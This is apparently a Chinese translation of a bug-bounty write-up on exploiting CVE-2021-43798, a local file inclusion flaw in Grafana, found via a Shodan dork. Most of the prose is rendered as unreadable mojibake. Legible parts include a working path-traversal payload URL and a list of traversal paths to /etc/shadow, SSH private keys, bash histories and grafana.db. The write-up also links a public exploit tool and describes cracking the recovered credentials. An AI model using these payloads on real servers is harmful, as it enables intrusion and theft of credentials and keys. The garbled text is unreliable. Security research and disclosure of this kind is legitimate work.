# ä» Shodan å‘†å­åˆ° GrafanağŸ“Šæœ¬åœ°æ–‡ä»¶åŒ…å«

> åŸæ–‡ï¼š<https://infosecwriteups.com/from-shodan-dork-to-grafana-local-file-inclusion-e77dc4cfc264?source=collection_archive---------0----------------------->

å—¨è¯»è€…ä»¬ğŸ“–ï¼Œè¿™æ˜¯æˆ‘åœ¨ä½¿ç”¨ shodan recon å’Œè¿›ä¸€æ­¥å¼€å‘ grafana æœåŠ¡æ—¶å‘ç°çš„å…³äºæœ¬åœ°æ–‡ä»¶åŒ…å«çš„æ–°æ–‡ç« ã€‚

æœ€åï¼Œæˆ‘è¿˜å°†æä¾›ä¸€ä¸ªæ¥è‡ªæˆ‘çš„ youtube é¢‘é“çš„è§†é¢‘ POC é“¾æ¥ï¼Œè¿™å°†æœ‰åŠ©äºæ‚¨æ›´æ¸…æ¥šåœ°ç†è§£è¿™ä¸€ç‚¹ã€‚

**è®©æˆ‘ä»¬å¼€å§‹å§ï¼Œ**

å¯¹äº grafana ç›¸å…³çš„æœåŠ¡ï¼Œæˆ‘ä½¿ç”¨ç®€å•çš„ shodan dork

"***title:grafana hostname:target***ä¹Ÿå¯ä»¥ç”¨***http . title:grafana***

ç»“æœï¼Œæˆ‘åœ¨ç›®æ ‡ IP ä¸Šè¿è¡Œäº†ä¸€ä¸ª grafana æœåŠ¡ã€‚

![](img/e239837a4073aef6bf34771672b34563.png)

æ‚¨å¯ä»¥è¿›ä¸€æ­¥ä½¿ç”¨ [**ipinfo.io**](https://ipinfo.io) æ¥æ”¶é›†æ›´å¤šä¸ IP åœ°å€ç›¸å…³çš„ä¿¡æ¯ã€‚

ç°åœ¨ï¼Œgrafana è¿è¡Œåœ¨ç«¯å£ 3000 ä¸Šï¼Œè¿™æ˜¯è¯¥æœåŠ¡çš„å¸¸ç”¨ç«¯å£ï¼Œåƒå¾€å¸¸ä¸€æ ·ï¼Œæˆ‘æ£€æŸ¥é»˜è®¤å‡­æ®ï¼Œä½†å®ƒä»¬å¯¹æˆ‘ä¸èµ·ä½œç”¨ã€‚

![](img/ed2741be2fbd98d7c9de2909a60a5d66.png)

æ­¤å¤–ï¼Œæˆ‘å‘ç°è¯¥æœåŠ¡è¿è¡Œåœ¨ç‰ˆæœ¬ **v8.0.4** ä¸Šï¼Œç„¶åæˆ‘æŸ¥æ‰¾è¯¥ç‰ˆæœ¬çš„å¯ç”¨ CVEï¼Œå‘ç°è¯¥ç‰ˆæœ¬å®¹æ˜“å—åˆ° LFI æ¼æ´çš„æ”»å‡»ã€‚

ä½ å¯ä»¥åœ¨ä¸‹é¢çš„æ ·æœ¬æˆªå›¾åº•éƒ¨çš„ç»†èŠ‚ä¸­æŸ¥çœ‹ç‰ˆæœ¬ã€‚å®ƒæ˜¯ 9.2.3ï¼Œä½†åœ¨æˆ‘çš„ä¾‹å­ä¸­ï¼Œç‰ˆæœ¬æ˜¯ 8.0.4ã€‚

![](img/98a713f2de406d9efc7675600fbec969.png)

***æ³¨æ„:LFI æ¼æ´å½±å“ Grafana 8.0.0-beta1 åˆ° 8.3.0***

LFI ç®€ä»‹:

æ”»å‡»è€…å¯ä»¥ä½¿ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«(LFI)æ¥æ¬ºéª— web åº”ç”¨ç¨‹åºæš´éœ²æˆ–è¿è¡Œ web æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚LFI æ”»å‡»å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œç”šè‡³è·¨ç«™ç‚¹è„šæœ¬ã€‚é€šå¸¸ï¼Œå½“åº”ç”¨ç¨‹åºä½¿ç”¨æ–‡ä»¶è·¯å¾„ä½œä¸ºè¾“å…¥æ—¶ï¼Œä¼šå‘ç”Ÿ LFIã€‚å¦‚æœåº”ç”¨ç¨‹åºå°†æ­¤è¾“å…¥è§†ä¸ºå¯ä¿¡ï¼Œåˆ™å¯ä»¥åœ¨ include è¯­å¥ä¸­ä½¿ç”¨æœ¬åœ°æ–‡ä»¶ã€‚

*é‚£ä¹ˆï¼Œæˆ‘ä»¬æ¥è¯´æ­£é¢˜ï¼Œ*

ç°åœ¨å®ƒå¾ˆå®¹æ˜“å—åˆ°**CVE-2021â€“43798**ä½ å¯ä»¥åœ¨[**https://cve.mitre.org/cgi-bin/cvename.cgi?é˜…è¯»/æŸ¥çœ‹æœ‰å…³è¿™ä¸ª CVE çš„è¯¦ç»†ä¿¡æ¯ name = CVE-2021-43798**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798)**ã€‚**

æ‰‹åŠ¨ï¼Œæˆ‘å‘ç° LFI åœ¨è·¯å¾„ **/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..æ’ä»¶**è­¦æŠ¥åˆ—è¡¨**ä¸Šçš„%2fetc/passwd**

é‚£ä¹ˆå®Œæ•´è·¯å¾„å°±å˜æˆäº† **/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd/**

æœ‰æ•ˆè´Ÿè½½:[**http://target _ IP:3000/public/plugins/alert list/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd/**](http://target_ip:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd/)

**ç»“æœ:**

![](img/147bc0071d6d0c459728e076f5ab8e30.png)

ä½†æ˜¯å¯ä»¥æœ‰å¾ˆå¤šæ’ä»¶ï¼Œä¾‹å¦‚

**è­¦æŠ¥åˆ—è¡¨
å…¬å‘Šåˆ—è¡¨
grafana-azure-monitor-data source
æ¡å½¢å›¾
æ¡å½¢æ ‡å°º
cloudwatch
ä»ªè¡¨ç›˜åˆ—è¡¨
å¼¹æ€§æœç´¢
æ ‡å°º
geomap
getting started
å †æ ˆé©±åŠ¨
å›¾å½¢
çŸ³å¢¨
çƒ­å›¾
ç›´æ–¹å›¾**

**è¿˜æœ‰æ›´å¤šâ€¦â€¦**

æ­¤å¤–ï¼Œé™¤äº† **/etc/passwd** ä¹‹å¤–ï¼Œè¿˜å¯èƒ½æœ‰æ›´å¤šçš„*è·¯å¾„*ï¼Œå¦‚æœ **/etc/passwd** ä¸å·¥ä½œï¼Œæˆ‘ä»¬å¯èƒ½ä¼šé”™è¿‡å…¶ä»–æ•æ„Ÿä¿¡æ¯

ä¾‹å¦‚:

**/..%2f..%2f..%2f..%2f..%2fconf/defaults.ini
/..%2f..%2f..%2f..%2f..%2fconf/grafana.ini
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..% 2 fetc/grafana/grafana . ini
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..% 2 fetc/grafana/defaults . ini
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/grafana/ã€‚bash_history
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/grafana/ã€‚ssh/id_rsa
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2froot/ã€‚bash_history
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2froot/ã€‚ssh/id_rsa
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..% 2 fusr/local/etc/grafana/grafana . ini
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..% 2f var/lib/grafana/grafana . db
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/net/fib_trie
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/net/tcp
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/self/cmdline**

æ‰€ä»¥æ‰‹åŠ¨åœ°ç”¨å„è‡ªçš„æ’ä»¶æŸ¥æ‰¾æ¯ä¸ªæ¡ˆä¾‹æ˜¯ä¸€ä¸ªæ¼«é•¿çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥ä½ å¯ä»¥ç¼–å†™è‡ªå·±çš„è„šæœ¬æ¥è‡ªåŠ¨å®Œæˆè¿™ä¸ªä»»åŠ¡ï¼Œ

ä¸ºäº†è¿›ä¸€æ­¥è‡ªåŠ¨åŒ–æ”»å‡»ï¼Œæˆ‘åœ¨ GitHub [**ä¸Šä½¿ç”¨äº†ä¸€ä¸ªä¸“é—¨ä¸ºè¿™ä¸ª CVE åˆ¶ä½œçš„å·¥å…· https://GitHub . com/Pedro havay/exploit-grafana-CVE-2021-43798**](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798/blob/main/README.md)

æ­£å¦‚æˆ‘å·²ç»è¯´è¿‡çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¦ä¸€ä¸ªè·¯å¾„ä¸­æ‰¾åˆ°æ›´æ•æ„Ÿçš„ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥åœ¨ **defaults.ini** è·¯å¾„ä¸­æ‰¾åˆ°ï¼Œæ­¤å¤–ï¼Œæˆ‘èƒ½å¤Ÿåœ¨ä¸Šè¿°å·¥å…·çš„å¸®åŠ©ä¸‹ç ´è§£å‡­è¯ï¼Œæˆ–è€…ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å…¶ä»–å·¥å…·æ¥ç ´è§£å¯†é’¥ï¼Œå¦‚ hashcat æˆ– john the ripperã€‚

![](img/050ff791971eb152b99897ded1a03bad.png)![](img/38908b6f84d5e8d48518c6d356188337.png)

**ç ´è§£å¯†é’¥**

![](img/a388d9f4d69531e4b89a6d25c161e290.png)

è¿™æ ·ï¼Œæ¼æ´çš„å½±å“ä¼šå¢åŠ ã€‚

**æˆ‘åœ¨ä¸‹é¢æ·»åŠ è§†é¢‘æ¦‚å¿µè¯æ˜:**

**æ„Ÿè°¢æ‚¨é˜…è¯»æ–‡ç« **ğŸ¤©

è®¢é˜…æˆ‘çš„ youtube é¢‘é“å¯»æ‰¾ bug ç›¸å…³çš„ä¸œè¥¿: [**redirect _poc**](https://www.youtube.com/channel/UCq7-Qf45etdk0qc35I_n7PQ?sub_confirmation=1)

ä½ å¯ä»¥åœ¨ Instagram ä¸Šå…³æ³¨æˆ‘ **varmaanu001**

åœ¨ Linkedin ä¸Šå…³æ³¨æˆ‘: [**æˆ‘çš„ _ Linkedin**](http://linkedin.com/in/anurag-verma-650b771a2)

## æ¥è‡ª Infosec çš„æŠ¥é“:Infosec æ¯å¤©éƒ½æœ‰å¾ˆå¤šå†…å®¹ï¼Œå¾ˆéš¾è·Ÿä¸Šã€‚[åŠ å…¥æˆ‘ä»¬çš„æ¯å‘¨æ—¶äº‹é€šè®¯](https://weekly.infosecwriteups.com/)ä»¥ 5 ç¯‡æ–‡ç« ã€4 ä¸ªçº¿ç¨‹ã€3 ä¸ªè§†é¢‘ã€2 ä¸ª GitHub Repos å’Œå·¥å…·ä»¥åŠ 1 ä¸ªå·¥ä½œæé†’çš„å½¢å¼å…è´¹è·å–æ‰€æœ‰æœ€æ–°çš„ Infosec è¶‹åŠ¿ï¼